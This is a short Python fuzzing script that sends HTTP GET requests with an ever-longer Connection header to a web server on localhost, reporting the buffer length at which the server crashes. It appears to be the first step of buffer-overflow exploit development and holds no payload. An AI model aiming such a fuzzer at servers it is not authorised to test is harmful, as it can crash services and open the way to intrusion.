import socket,sys
from time import sleep
ip ="127.0.0.1"
port=80
c=0

while True:
 try: 
      c=c+1
      buffer="A"*200
      buffer="GET / HTTP/1.1\r\n"+"Connection: "+buffer*c+"\r\n\r\n"
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(buffer)
      print(buffer+str(len(buffer)))
      sleep(2)
      s.close()
      if len(buffer)>5000:
        break
 except:
      print("Crashed At "+str(len(buffer)))
      sys.exit()      
           
print("can't crack " +str(len(buffer)))
